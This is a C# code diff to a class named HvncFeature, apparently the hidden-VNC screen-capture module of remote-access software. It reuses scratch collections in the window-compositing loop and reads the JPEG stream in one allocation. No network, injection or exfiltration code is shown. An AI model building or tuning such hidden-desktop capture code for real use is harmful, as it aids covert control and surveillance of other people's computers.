@@ -283,6 +283,11 @@ internal static class HvncFeature
     // Per-window capture cache (DIBSection per hwnd — reused across frames)
     private static readonly Dictionary<nint, WinCache> _winCache = new();
 
+    // Reusable scratch collections for CaptureComposite — avoids per-frame heap alloc
+    private static readonly HashSet<nint> _captureAlive = new();
+    private static readonly List<(nint hwnd, RECT r)> _captureToProcess = new(32);
+    private static readonly List<nint> _captureStale = new(4);
+
     // Composite DIBSection at canvas resolution
     private static nint _compHdcRef; // reference DC (physical screen)
     private static nint _compHdc;
@@ -604,27 +609,27 @@ internal static class HvncFeature
         nint top  = GetTopWindow(0);
         nint walk = top != 0 ? GetWindow(top, 1 /*GW_HWNDLAST*/) : 0;
 
-        var alive      = new HashSet<nint>();
-        var toProcess  = new List<(nint hwnd, RECT r)>(32);
+        _captureAlive.Clear();
+        _captureToProcess.Clear();
 
         for (nint cur = walk; cur != 0; cur = GetWindow(cur, 3 /*GW_HWNDPREV*/))
         {
-            alive.Add(cur);
+            _captureAlive.Add(cur);
             if (!IsWindowVisible(cur) || IsIconic(cur)) continue;
             GetWindowRect(cur, out var r);
             if (r.right <= r.left || r.bottom <= r.top) continue;
             if (r.right <= 0 || r.bottom <= 0 || r.left >= w || r.top >= h) continue;
-            toProcess.Add((cur, r));
+            _captureToProcess.Add((cur, r));
         }
 
         // Evict cache entries for windows that no longer exist
-        var stale = new List<nint>(4);
+        _captureStale.Clear();
         foreach (var kv in _winCache)
-            if (!alive.Contains(kv.Key)) stale.Add(kv.Key);
-        foreach (var k in stale) { FreeCacheEntry(_winCache[k]); _winCache.Remove(k); }
+            if (!_captureAlive.Contains(kv.Key)) _captureStale.Add(kv.Key);
+        foreach (var k in _captureStale) { FreeCacheEntry(_winCache[k]); _winCache.Remove(k); }
 
         int drawn = 0;
-        foreach (var (hwnd, r) in toProcess)
+        foreach (var (hwnd, r) in _captureToProcess)
         {
             int ww = r.right  - r.left;
             int wh = r.bottom - r.top;
@@ -765,29 +770,24 @@ internal static class HvncFeature
             };
             var clsid = JpegClsid;
             GdipSaveImageToStream(bmp, stream, ref clsid, (nint)(&ep));
-            long pos = 0;
             var vtSeek = Marshal.GetDelegateForFunctionPointer<VtSeek>((*(nint**)stream)[5]);
-            vtSeek(stream, 0, 0, ref pos);
-            var chunks = new List<byte[]>();
-            int total  = 0;
-            var buf    = new byte[65536];
-            fixed (byte* pbuf = buf)
+            var vtRead = Marshal.GetDelegateForFunctionPointer<VtRead>((*(nint**)stream)[3]);
+
+            // Seek to end to get size, then seek back to start — one alloc, one read
+            long size = 0;
+            vtSeek(stream, 0, 2 /*STREAM_SEEK_END*/, ref size);
+            if (size <= 0) { Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream); return null; }
+            long pos = 0;
+            vtSeek(stream, 0, 0 /*STREAM_SEEK_SET*/, ref pos);
+
+            var result = new byte[size];
+            fixed (byte* pResult = result)
             {
-                var vtRead = Marshal.GetDelegateForFunctionPointer<VtRead>((*(nint**)stream)[3]);
-                while (true)
-                {
-                    uint cbRead = 0;
-                    vtRead(stream, (nint)pbuf, (uint)buf.Length, out cbRead);
-                    if (cbRead == 0) break;
-                    var chunk = new byte[cbRead];
-                    Buffer.BlockCopy(buf, 0, chunk, 0, (int)cbRead);
-                    chunks.Add(chunk); total += (int)cbRead;
-                }
+                uint cbRead = 0;
+                vtRead(stream, (nint)pResult, (uint)size, out cbRead);
+                Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream);
+                if (cbRead == 0) return null;
             }
-            Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream);
-            if (total == 0) return null;
-            var result = new byte[total]; int off = 0;
-            foreach (var c in chunks) { Buffer.BlockCopy(c, 0, result, off, c.Length); off += c.Length; }
             return result;
         }
         finally { GdipDisposeImage(bmp); }
